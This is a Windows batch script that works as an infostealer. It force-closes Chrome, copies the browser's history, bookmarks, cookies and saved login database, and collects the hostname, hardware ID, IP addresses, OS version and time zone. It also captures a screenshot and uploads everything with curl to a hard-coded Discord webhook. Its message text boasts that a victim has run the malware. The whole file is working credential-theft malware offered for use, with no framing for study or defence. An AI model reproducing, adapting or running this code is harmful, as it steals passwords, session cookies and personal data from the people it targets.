@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
color 0f
mode con cols=61 lines=30
cls

set "ScOrig=%~dp0"
set "exfilKey=https://discord.com/api/webhooks/1294342109897162794/qin3QW18hStA0lyK1uluwfVAMWxCyHdoBjqBnTSrYnAeW-2_mm3v94dOihrMUcHuwYrJ"
set "chrome_data_path=%LOCALAPPDATA%\Google\Chrome\User Data"
set "output_dir=%localappdata%\Screenshots"
set "screenshotDir=%localappdata%\Screenshots"
set "screenshotFile=%screenshotDir%\screenshot.png"
if not exist "%output_dir%" mkdir "%output_dir%"
cls


taskkill /f /im "chrome.exe"
copy "%chrome_data_path%\Default\History" "%output_dir%\History" >nul
copy "%chrome_data_path%\Default\Bookmarks" "%output_dir%\Bookmarks" >nul
copy "%chrome_data_path%\Default\Cookies" "%output_dir%\Cookies" >nul
copy "%chrome_data_path%\Default\Login Data" "%output_dir%\Login Data" >nul
cls

powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' | Out-Null"
powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' | Out-Null"
powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' | Out-Null"
cls

set "file1=%localappdata%\Screenshots\Bookmarks.zip"
cls
set "file2=%localappdata%\Screenshots\History.zip"
cls
set "file3=%localappdata%\Screenshots\Login_Data.zip"
cls


setlocal enableextensions enabledelayedexpansion

set "size=0"
    for %%a in (a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9) do (
        set "a_!size!=%%a"
        set /a "size+=1"
    )
set keys=1
    for /l %%k in (1 1 %keys%) do (
        set "key="
        for /l %%a in (1 1 30) do (
            set /a "r=!random! %% size"
            for %%b in (!r!) do set "key=!key!!a_%%b!"
        )
        SET "license=!key:~0,5!-!key:~5,5!-!key:~10,5!-!key:~15,5!-!key:~20,5!-!key:~25,5!"
    ) 

for /f "tokens=2 delims==" %%A in ('wmic path Win32_ComputerSystemProduct get UUID /value') do set "hwid=%%A"
set hwid=%hwid: =%
cls

if not exist "%screenshotDir%" mkdir "%screenshotDir%"
cd %screenshotDir%
cls


for /f "delims=" %%i in ('curl -s https://ifconfig.me') do set PUBLIC_IP=%%i
cls

for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do (
    set "ip=%%i"
    setlocal enabledelayedexpansion
    set "ip=!ip:~1!"
)
cls


for /f "tokens=* delims=" %%h in ('hostname') do (set "host=%%h")
cls


for /f "tokens=* delims=" %%v in ('ver') do (set "osver=%%v")
cls


for /f "tokens=* delims=" %%t in ('tzutil /g') do (set "timezone=%%t")
cls

set "screenshotFile=%screenshotDir%\screenshot.png"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen(0, 0, 0, 0, $Screen.Size); $Bitmap.Save('%screenshotFile%', [System.Drawing.Imaging.ImageFormat]::Png); $Graphics.Dispose(); $Bitmap.Dispose();"
cls

set FILE_PATH=%screenshotDir%\screenshot.png
set "json_payload1={\"embeds\": [{\"title\": \"New Target Information\", \"description\": \"**A retard has ran your malware YIPEE** \n.        ```\nHostname: %host%``` ```\nOS Version: %osver%``` ```\nUUID: %hwid%``` ```\nIP Address: !ip!``` ```\nPublic IP Address: %PUBLIC_IP%``` ```\nTime Zone: %timezone%```\", \"color\": 9503569, \"image\": {\"url\": \"attachment://screenshot.png\"}}]}"
curl -F "payload_json=%json_payload1%" -F "file1=@%file_path%" "%exfilKey%"
cls

curl -F "file=@%file1%" %exfilKey%
cls
curl -F "file=@%file2%" %exfilKey%
cls
curl -F "file=@%file3%" %exfilKey%
cls




